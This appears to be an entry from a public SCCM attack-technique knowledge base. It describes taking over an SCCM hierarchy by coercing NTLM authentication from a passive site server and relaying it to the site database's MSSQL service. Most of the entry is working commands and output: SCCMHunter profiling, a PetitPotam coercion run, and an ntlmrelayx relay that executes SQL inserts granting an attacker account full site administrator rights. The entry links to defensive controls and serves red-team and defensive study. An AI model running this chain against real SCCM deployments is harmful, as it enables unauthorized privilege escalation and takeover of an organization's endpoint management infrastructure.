# Site Takeover via NTLM Coercion and MSSQL Relay From Passive Site Server

## Code Name
SITETAKEOVER03

## ATT&CK TTPs
- Privilege Escalation

## Required Privilege / Context

Valid domain credentials with network connectivity to the passive primary site server and site database server.

## Summary
For high availability configurations the passive site server role is deployed to SCCM sites where redundancy for the site server role is required. A passive site server share's the same configuration and privileges as the active site server yet performs no writes or changes to the site until promoted manually or during an automated failover. As such, the passive site server machine account is required to be a sysadmin for the site database. In default configurations, the MSSQL service on the site database server is vulnerable to NTLM relay attacks.

## Impact

This technique may allow an attacker to coerce and relay authentication from a passive site server machine account to the MSSQL service of the site database server and execute SQL queries in the privileged context of the relayed account to compromise the hierarchy.

## Examples

- Use SCCMHunter to profile SCCM component server roles
- Use SCCMHunter to generate MSSQL query syntax
- Coerce authentication from passive site server
- Use NTLMrelayx to relay credentials to remote site database

### SCCMHunter

```
[04:24:43 PM] INFO     [+] Finished profiling Site Servers.                                                                                                                                                                                                                                    
[04:24:43 PM] INFO     +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | Hostname             | SiteCode          | SigningStatus   | SiteServer   | SMSProvider   | Active   | Passive   | MSSQL   |                                                                                                                                          
                       +======================+===================+=================+==============+===============+==========+===========+=========+                                                                                                                                          
                       | sccm.internal.lab    | LAB               | False           | True         | True          | True     | False     | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       | passive.internal.lab | LAB               | False           | True         | True          | False    | True      | False   |                                                                                                                                          
                       +----------------------+-------------------+-----------------+--------------+---------------+----------+-----------+---------+                                                                                                                                          
                       

[04:24:52 PM] INFO     [+] Finished profiling all discovered computers.                                                                                                                                                                           
[04:24:52 PM] INFO     +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                     
                       | Hostname                | SiteCode   | SigningStatus   | SiteServer   | ManagementPoint   | DistributionPoint   | SMSProvider   | WSUS   | MSSQL   |                                                                     
                       +=========================+============+=================+==============+===================+=====================+===============+========+=========+                                                                                                                                     
                       | sql.internal.lab        | None       | False           | False        | False             | False               | False         | False  | True    |                                                                     
                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+                                                                     
                       | sccm.internal.lab       | LAB        | False           | True         | True              | False               | True          | False  | False   |                                                                     
                       +-------------------------+------------+-----------------+--------------+-------------------+---------------------+---------------+--------+---------+  
```

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/sccmhunter]
└─# python3 sccmhunter.py mssql -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -tu specter -sc LAB

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 v0.0.2                   
                                                                 @garrfoster                    
    
    
    
[04:20:44 PM] INFO     [*] Resolving specter SID...                                                                                              
[04:20:44 PM] INFO     [*] Converted specter SID to 0x010500000000000515000000010A878E28A377F8F541F39A6D040000                                   
[04:20:44 PM] INFO     [*] Use the following to add specter as a Site Server Admin.                                                              

USE CM_LAB; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000010A878E28A377F8F541F39A6D040000,'lab\specter',0,0,'','','','','LAB');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00004','1');
```

### PetitPotam

```
┌──(root㉿DEKSTOP-2QO0YEUW)-[/opt/PetitPotam]
└─# python3 PetitPotam.py -u lowpriv -p P@ssw0rd 10.10.100.136 passive.internal.lab

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:passive.internal.lab[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

### NTLMrelayx

```
┌──(adminservice)─(root㉿DEKSTOP-2QO0YEUW)-[/opt/adminservice/examples]
└─# python3 ntlmrelayx.py -t mssql://sql.internal.lab -smb2support -q "USE CM_LAB; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000010A878E28A377F8F541F39A6D040000,'lab\specter',0,0,'','','','','LAB');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00004','1');
"
Impacket v0.10.1.dev1+20230802.213755.1cebdf31 - Copyright 2022 Fortra

[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.100.141, attacking target mssql://sql.internal.lab
[*] Authenticating against mssql://sql.internal.lab as LAB/PASSIVE$ SUCCEED
[*] Executing SQL: USE CM_LAB; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000010A878E28A377F8F541F39A6D040000,'lab\specter',0,0,'','','','','LAB');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'lab\specter'),'SMS0001R','SMS00004','1');

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: CM_LAB
[*] INFO(SQL): Line 1: Changed database context to 'CM_LAB'.
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.10.100.141 controlled, but there are no more targets left!
```


## Defensive IDs
- [PROTECT01](../../defense-techniques/PROTECT01/protect01-description.md)
- [PROTECT15](../../defense-techniques/PROTECT15/protect15-description.md)
- [PROTECT21](../../defense-techniques/PROTECT21/protect21-description.md)
- [DETECT01](../../defense-techniques/DETECT01/detect01-description.md)



## References
Author, Title, URL
Microsoft, Site server high availability in Configuration Manager, https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/configure/site-server-high-availability